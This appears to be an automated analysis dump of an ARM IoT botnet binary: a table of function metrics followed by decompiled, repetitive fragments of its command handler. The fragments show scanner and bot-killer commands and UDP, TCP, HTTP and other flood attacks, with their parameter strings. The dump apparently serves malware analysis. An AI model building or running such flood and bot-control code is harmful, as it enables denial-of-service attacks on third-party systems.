__GI_sigprocmask                                  |4   |108     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2r_o                                 |0   |192     |0             |0           |
----------------------------------------------------------------------------------------------
printchar                                         |2   |110     |0             |0           |
----------------------------------------------------------------------------------------------
strcat                                            |2   |119     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_dtors_aux                             |0   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_cdcmple                                   |0   |105     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_wcommit                                   |0   |111     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcsrtombs                                    |6   |101     |0             |0           |
----------------------------------------------------------------------------------------------
bzero                                             |2   |99      |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r7                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dsub                                      |4   |99      |0             |0           |
----------------------------------------------------------------------------------------------
__GI_ntohs                                        |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strdup                                       |1   |105     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_uidivmod                                  |2   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__sigdelset                                       |2   |100     |0             |0           |
----------------------------------------------------------------------------------------------
socket                                            |3   |107     |0             |0           |
----------------------------------------------------------------------------------------------
_pthread_cleanup_push_defer                       |3   |99      |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r8                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
_dl_aux_init                                      |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
wildString                                        |2   |162     |0             |0           |
----------------------------------------------------------------------------------------------
free                                              |0   |309     |0             |0           |
----------------------------------------------------------------------------------------------
_load_inttype                                     |0   |141     |0             |0           |
----------------------------------------------------------------------------------------------
_start                                            |2   |99      |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getsockname                                  |5   |107     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_unwind_cpp_pr2                            |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
__floatsidf                                       |1   |110     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r1                                      |1   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__ltdf2                                           |0   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__GI___glibc_strerror_r                           |3   |99      |0             |0           |
----------------------------------------------------------------------------------------------
_24_d                                             |3   |105     |0             |0           |
----------------------------------------------------------------------------------------------
function_15ad4                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__xstat32_conv                                    |2   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_htonl                                        |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
skip_nospace                                      |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
prctl                                             |5   |108     |0             |0           |
----------------------------------------------------------------------------------------------
function_17198                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
gettimeofday                                      |2   |107     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_lr                                      |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |100     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |116     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_stat                                         |2   |114     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
malloc_trim                                       |1   |108     |0             |0           |
----------------------------------------------------------------------------------------------
kill                                              |2   |108     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_ui2d                                      |1   |105     |0             |0           |
----------------------------------------------------------------------------------------------
function_1b280                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___errno_location                             |0   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |2   |108     |0             |0           |
----------------------------------------------------------------------------------------------
_fini                                             |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |133     |0             |0           |
----------------------------------------------------------------------------------------------
function_16b88                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |111     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |3   |110     |0             |0           |
----------------------------------------------------------------------------------------------
function_13820                                    |4   |105     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmpgt                                    |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |2   |98      |0             |0           |
----------------------------------------------------------------------------------------------
function_1b854                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |1   |101     |0             |0           |
----------------------------------------------------------------------------------------------
uname                                             |1   |107     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |0   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |0   |109     |0             |0           |
----------------------------------------------------------------------------------------------
function_15138                                    |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |107     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_dcmpge                                    |4   |100     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |4   |107     |0             |0           |
----------------------------------------------------------------------------------------------
function_18d58                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__adddf3                                          |4   |328     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___fcntl_nocancel                             |3   |107     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__GI_write                                        |2   |107     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsockopt                                   |5   |108     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_close                                        |1   |107     |0             |0           |
----------------------------------------------------------------------------------------------
function_1dbb4                                    |0   |124     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_poll                                         |6   |108     |0             |0           |
----------------------------------------------------------------------------------------------
function_1dc08                                    |4   |138     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |2   |308     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
function_1e014                                    |0   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |171     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |0   |229     |0             |0           |
----------------------------------------------------------------------------------------------
function_19058                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |108     |0             |0           |
----------------------------------------------------------------------------------------------
_pthread_cleanup_pop_restore                      |2   |108     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strrchr                                      |4   |123     |0             |0           |
----------------------------------------------------------------------------------------------
__xstat64_conv                                    |2   |100     |0             |0           |
----------------------------------------------------------------------------------------------
calloc                                            |2   |195     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |4   |99      |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |2   |108     |0             |0           |
----------------------------------------------------------------------------------------------
function_14b58                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_idivmod                                   |2   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sendto                                     |6   |108     |0             |0           |
----------------------------------------------------------------------------------------------
function_173c4                                    |1   |105     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |2   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__floatdidf                                       |2   |101     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |105     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |106     |0             |0           |
----------------------------------------------------------------------------------------------
__div0                                            |0   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |0   |110     |0             |0           |
----------------------------------------------------------------------------------------------
function_189e8                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |149     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |1   |127     |0             |0           |
----------------------------------------------------------------------------------------------
function_1e1a8                                    |2   |99      |0             |0           |
----------------------------------------------------------------------------------------------
ioctl                                             |3   |107     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r0                                      |1   |99      |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_sl                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
mremap                                            |4   |108     |0             |0           |
----------------------------------------------------------------------------------------------
function_17468                                    |1   |105     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |117     |0             |0           |
----------------------------------------------------------------------------------------------
_24_d_1                                           |3   |109     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_lseek64                                      |4   |116     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |2   |111     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |170     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |0   |98      |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |2   |104     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |4   |124     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |5   |124     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_r9                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_open                                         |2   |112     |0             |0           |
----------------------------------------------------------------------------------------------
function_14a9c                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |98      |0             |0           |
----------------------------------------------------------------------------------------------
function_14d7c                                    |1   |104     |0             |0           |
----------------------------------------------------------------------------------------------
execl                                             |5   |118     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_mutex_init                              |0   |98      |0             |0           |
----------------------------------------------------------------------------------------------
memcpy                                            |0   |100     |0             |0           |
----------------------------------------------------------------------------------------------
__extendsfdf2                                     |1   |158     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_unwind_cpp_pr1                            |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |123     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |2   |107     |0             |0           |
----------------------------------------------------------------------------------------------
sleep                                             |1   |127     |0             |0           |
----------------------------------------------------------------------------------------------
_call_via_sp                                      |0   |101     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |1   |248     |0             |0           |
----------------------------------------------------------------------------------------------
function_17304                                    |1   |105     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |5   |110     |0             |0           |
----------------------------------------------------------------------------------------------
function_1dc68                                    |0   |701     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |0   |124     |0             |0           |
----------------------------------------------------------------------------------------------
__default_rt_sa_restorer                          |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
__gtdf2                                           |0   |98      |0             |0           |
----------------------------------------------------------------------------------------------
__GI_ntohl                                        |1   |98      |0             |0           |
----------------------------------------------------------------------------------------------
feof                                              |1   |129     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_recv                                       |5   |108     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpid                                       |0   |99      |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |106     |0             |0           |
----------------------------------------------------------------------------------------------
function_1e3d8                                    |0   |393     |0             |0           |
----------------------------------------------------------------------------------------------
__aeabi_cdrcmple                                  |0   |98      |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |5   |98      |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 12301
++++++++ FUNCTION END 17073
++++++++ FUNCTION LENGTH 4772
    if (__GI_strcoll((char *)*a2, (int32_t)"PING") == 0) {
        sockprintf(v90, (int32_t)"PONG!");
            getdtablesize();
            sockprintf(v90, (int32_t)"%d");
                    kill(v148, 9);
                    sockprintf(v90, (int32_t)"STOPPING SCANNER");
                        int32_t v149 = __libc_fork(); // 0x10990
                            __GI_inet_ntoa(v92);
                            sockprintf(v90, (int32_t)"STARTING SCANNER ON -> %s");
                                if (listFork() == 0) {
                                    __GI_inet_ntoa(v92);
                                    v145 = sockprintf(v90, (int32_t)"COMMENCING BOT KILL ON -> %s");
                                    botkiller(v145);
                            if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                                __GI_inet_ntoa(v92);
                                sockprintf(v90, (int32_t)"My Public IP: %s");
                                if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                            return sockprintf(v90, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                                                                        if (listFork() == 0) {
                                                                            sendUDP(v124, v104, v105, v106, v107, v93, v99, v98);
                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                            result = sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                                            result = sockprintf(v90, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v131, v111, v112, v113, v132, v96, v97);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendTCP(v94, v111, v112, v113, v132, v96, v97);
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendHTTP(*v114, v136, (int16_t)(v115 % 0x10000), v138, v116, v117);
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                                                                        v168 = listFork();
                                                                                                                                                                            sendSTD(v163, v161, v162, 0);
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                        result2 = sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                            while (true) {
                                                                                                                                                                result3 = listFork();
                                                                                                                                                                sendCNC(v155, v153, v154, 0);
                                                                                                                                                                                    v168 = listFork();
                                                                                                                                                                                        sendSTD(v163, v161, v162, 0);
                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                                            sockprintf(v90, (int32_t)"None Killed.");
                                                                                                                                                                                                            sockprintf(v90, (int32_t)"Killed %d.");
                                                                                                                                                                                                    if (*v171 != __GI_getpid()) {
                                                                                                                                                                                                        kill(v173, 9);
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                            sendSTD(v158, v161, v162, 0);
                                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                    result2 = sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendCNC(v150, v153, v154, 0);
                                                                                                                                                                        __GI_close(v90);
                                                                                                                                                                                    v168 = listFork();
                                                                                                                                                                                        sendSTD(v163, v161, v162, 0);
                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                    while (true) {
                                                                                                                                                                    result2 = sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                                v168 = listFork();
                                                                                                                                                                                    sendSTD(v163, v161, v162, 0);
                                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                result2 = sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                    while (true) {
                                                                                                                                                return sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                    result3 = listFork();
                                                                                                                                                    sendCNC(v155, v153, v154, 0);
                                                                                                                                                                        v168 = listFork();
                                                                                                                                                                            sendSTD(v163, v161, v162, 0);
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                        while (true) {
                                                                                                                                                        result2 = sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                            while (true) {
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v163, v161, v162, 0);
                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                            while (true) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                    while (true) {
                                                                                                                                                    sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                        while (true) {
                                                                                                                                    sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendSTD(v163, v161, v162, 0);
                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                while (true) {
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                        while (true) {
                                                                                                                                        sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                            while (true) {
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendHTTP(*v114, *(int32_t *)(v89 + 8), (int16_t)v176, v179, v177, atol(v178));
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendCNC(v155, v153, v154, 0);
                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                                sendSTD(v163, v161, v162, 0);
                                                                                                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                while (true) {
                                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                            while (true) {
                                                                                                                                                                            sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                                        sendSTD(v163, v161, v162, 0);
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                    sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                            sendSTD(v163, v161, v162, 0);
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                        sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendCNC(v155, v153, v154, 0);
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendSTD(v163, v161, v162, 0);
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v163, v161, v162, 0);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                    sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendSTD(v163, v161, v162, 0);
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                        sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendCNC(v155, v153, v154, 0);
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                                        sendSTD(v163, v161, v162, 0);
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                    sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                                sendSTD(v163, v161, v162, 0);
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                            sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendSTD(v163, v161, v162, 0);
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendCNC(v155, v153, v154, 0);
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                                        sendSTD(v163, v161, v162, 0);
                                                                                                                                                                        while (true) {
                                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                    sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                while (true) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendSTD(v163, v161, v162, 0);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                            sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                    sendSTD(v163, v161, v162, 0);
                                                                                                                                                    while (true) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendCNC(v155, v153, v154, 0);
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                                    sendSTD(v163, v161, v162, 0);
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                                            sendSTD(v163, v161, v162, 0);
                                                                                                                                                                            while (true) {
                                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                        sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                        sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendSTD(v163, v161, v162, 0);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                            sendCNC(v155, v153, v154, 0);
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                                    sendSTD(v163, v161, v162, 0);
                                                                                                                                                                    while (true) {
                                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                                            while (true) {
                                                                                                                                                if (listFork() == 0) {
                                                                                                                                                        if (listFork() == 0) {
                                                                                                                                                            sendSTD(v163, v161, v162, 0);
                                                                                                                                                            while (true) {
                                                                                                                                                                if (listFork() == 0) {
                                                                                                                                        sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                                        sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendSTD(v163, v161, v162, 0);
                                                                                                                                                while (true) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                            sockprintf(v90, (int32_t)"STD <target> <port> <time>");
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendHTTP(*v114, v136, (int16_t)(v115 % 0x10000), v138, v116, v117);
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                                sendCNC(v155, v153, v154, 0);
                                                                                                                                                                while (true) {
                                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                            sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                                sendCNC(v155, v153, v154, 0);
                                                                                                                                                while (true) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                            sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendHTTP2(v141, v142, (int16_t)(v120 % 0x10000), v143, v121, v122);
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendCNC(v155, v153, v154, 0);
                                                                                                                                                        while (true) {
                                                                                                                                                            if (listFork() == 0) {
                                                                                                                                    sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendCNC(v155, v153, v154, 0);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                    sockprintf(v90, (int32_t)"CNC <target> <port> <time>");
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTPFLOOD") == 0) {
